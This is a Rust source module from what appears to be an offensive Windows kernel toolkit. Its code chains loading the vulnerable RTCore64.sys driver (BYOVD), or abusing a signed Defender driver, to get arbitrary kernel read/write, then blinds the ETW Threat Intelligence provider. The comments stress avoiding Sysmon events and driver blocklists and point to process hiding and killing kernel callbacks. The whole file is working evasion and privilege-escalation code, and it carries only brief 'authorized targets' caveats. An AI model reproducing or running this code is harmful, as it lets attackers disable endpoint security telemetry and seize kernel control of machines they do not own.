//! Windows-specific kernel-tier implementation — the `win/` shell.
//!
//! This module holds the Windows-only glue that turns the platform-agnostic
//! algorithms (etwti, byovd, telemetry, persistence, netsec) into a working
//! kernel-tier toolkit:
//!
//! - [`resolve`] — GetModuleHandleA + GetProcAddress real binding (replaces
//!   the stub in byovd.rs).
//! - [`driver_load`] — NtLoadDriver bootstrap (registry key + ImagePath + load).
//! - [`kernel_base`] — ntoskrnl base via NtQuerySystemInformation.
//! - [`pagewalk`] — x64 4-level page-table walk (VA→PA, pure + unit-tested).
//! - [`va_rw`] — VA-aware KernelRw over a physical driver + page walk.
//!
//! ## Full bootstrap chain
//! ```text
//!   operator: bootstrap_byovd("RTCore64.sys", "RTCore64")
//!     → driver_load::LoadedDriver::load   (registry + NtLoadDriver)
//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\RTCore64)
//!     → kernel_base::ntoskrnl_base()      (NtQuerySystemInformation)
//!     → resolve_kernel_symbol(ntoskrnl, "EtwThreatIntProvRegHandle")
//!     → etwti::EtwTiBlind::blind(krw)     (the algorithm runs)
//! ```
//!
//! ## Safety / risk
//! Loading a driver is irreversible (until NtUnloadDriver) and changes kernel
//! state. A wrong kernel write bugchecks. Test on a VM. Only authorized targets.

#![cfg(target_os = "windows")]

pub mod resolve;
pub mod driver_load;
pub mod kernel_base;
pub mod pagewalk;
pub mod pattern_scan;
pub mod va_rw;
/// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
/// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
/// file drop or driver load. No blocklist signature, no Sysmon EID 6.
pub mod ksld;

use crate::{EtwTiKit, KernelRw, KitError};
use crate::etwti::{EtwTiBlind, EtwTiOffsets};
use crate::byovd::{ByovdDriver, VulnDriverIoctl, RtCore64};
use alloc::boxed::Box;
use alloc::format;

/// The result of a successful kernel bootstrap — wraps whichever `KernelRw`
/// primitive was obtained. The caller inspects the variant to decide cleanup
/// (KslD has no explicit cleanup; BYOVD carries a `LoadedDriver` to unload).
pub enum KernelBootstrap {
    /// KslD.sys (Living off the Defender) — the preferred path.
    /// No file drop, no driver load, no Sysmon EID 6. The device handle is
    /// owned by `LivingOffDefender` and closed on drop.
    KslD(ksld::LivingOffDefender),
    /// BYOVD fallback — a vulnerable driver loaded via NtLoadDriver.
    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
    Byovd(driver_load::LoadedDriver, ByovdDriver),
}

impl KernelBootstrap {
    /// Borrow the `KernelRw` regardless of variant.
    pub fn as_kernel_rw(&self) -> &dyn KernelRw {
        match self {
            KernelBootstrap::KslD(d) => d,
            KernelBootstrap::Byovd(_, d) => d,
        }
    }
}

/// Unified kernel bootstrap: KslD.sys → BYOVD fallback.
///
/// Follows the priority order from `docs/p2-2026-kernel-tier-deepdive.md §0`:
/// 1. **KslD.sys** (Living off the Defender) — lowest noise, no driver load,
///    no Sysmon EID 6, no blocklist risk. Default path.
/// 2. **BYOVD** — fallback if KslD is unavailable (Defender disabled/tampered).
///    Higher noise (Sysmon EID 6) but reliable.
///
/// Returns a `KernelBootstrap` enum so the caller knows which path was taken
/// (relevant for cleanup: KslD auto-closes on drop; BYOVD needs `unload()`).
///
/// `sys_path` / `svc_name` are only used for the BYOVD fallback — they can be
/// `None` to disable the BYOVD path entirely (KslD-only, fail if unavailable).
///
/// # Safety
/// Loads a driver (BYOVD path) or opens a kernel device handle (KslD path).
/// Both can BSOD on bad kernel writes. VM only.
pub unsafe fn bootstrap_chain(
    sys_path: Option<&[u16]>,
    svc_name: Option<&[u16]>,
) -> Result<KernelBootstrap, KitError> {
    // Priority 1: KslD.sys — Living off the Defender.
    match unsafe { ksld::bootstrap_ksld() } {
        Ok(defender) => {
            return Ok(KernelBootstrap::KslD(defender));
        }
        Err(e) => {
            // KslD unavailable — log and fall through to BYOVD.
            // Don't allocate here; just trace the reason.
            let _ = e; // the KitError is informational; BYOVD may still work
        }
    }

    // Priority 2: BYOVD fallback.
    let (sys, svc) = match (sys_path, svc_name) {
        (Some(s), Some(v)) => (s, v),
        _ => {
            return Err(KitError::Other(format!(
                "bootstrap_chain: KslD unavailable and no BYOVD path provided \
                 (pass sys_path + svc_name to enable BYOVD fallback)"
            )));
        }
    };

    let (loaded, krw) = unsafe { bootstrap_byovd(sys, svc) }?;
    Ok(KernelBootstrap::Byovd(loaded, krw))
}

/// The full BYOVD bootstrap: load driver → open device → return KernelRw.
///
/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
/// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
///
/// Returns the loaded driver (for cleanup) + the ByovdDriver KernelRw.
///
/// # Safety
/// Loads a driver into the kernel. BSOD risk. Caller must have
/// SeLoadDriverPrivilege. Test on a VM.
pub unsafe fn bootstrap_byovd(
    sys_path: &[u16],
    svc_name: &[u16],
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    // 1. Load the driver.
    let loaded = unsafe { driver_load::LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    // 2. Open the device (CreateFileW on \\.\RTCore64).
    let driver: Box<dyn VulnDriverIoctl> = Box::new(RtCore64);
    let krw = match unsafe { ByovdDriver::open(driver) } {
        Ok(k) => k,
        Err(e) => {
            // Cleanup: unload the driver before propagating the error.
            let mut l = loaded;
            l.unload();
            return Err(KitError::NoPrimitive(e));
        }
    };

    Ok((loaded, krw))
}

/// Blind ETW-TI end-to-end: bootstrap BYOVD → resolve handle → blind.
///
/// Convenience: does the full chain in one call. Returns the loaded driver +
/// the KernelRw (for further operations like process hiding / callback kill).
///
/// # Safety
/// Loads a driver + writes kernel memory. BSOD risk. VM only.
pub unsafe fn blind_etw_ti_full(
    sys_path: &[u16],
    svc_name: &[u16],
    prov_reg_handle_kva: usize,
    offsets: EtwTiOffsets,
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    let (mut loaded, krw) = unsafe { bootstrap_byovd(sys_path, svc_name) }?;
    let kit = EtwTiBlind { prov_reg_handle_kva, offsets };
    match kit.blind(&krw) {
        Ok(()) => Ok((loaded, krw)),
        Err(e) => {
            loaded.unload();
            Err(e)
        }
    }
}
